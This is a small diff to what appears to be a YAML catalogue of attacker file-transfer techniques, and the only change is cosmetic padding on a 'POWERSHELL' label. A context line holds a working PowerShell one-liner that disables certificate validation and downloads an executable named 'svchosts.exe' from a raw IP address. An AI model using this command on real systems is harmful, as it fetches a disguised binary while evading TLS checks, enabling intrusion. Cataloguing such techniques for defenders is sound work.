@@ -3,7 +3,7 @@ functions:
   file-transfer:
     - description: Download Files
       code: |
-        POWERSHELL
+        +++++++++++POWERSHELL+++++++++++
 
         powershell -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).DownloadFile('https://68.183.217.18:56789/svchosts.exe','svchosts.exe')"
 
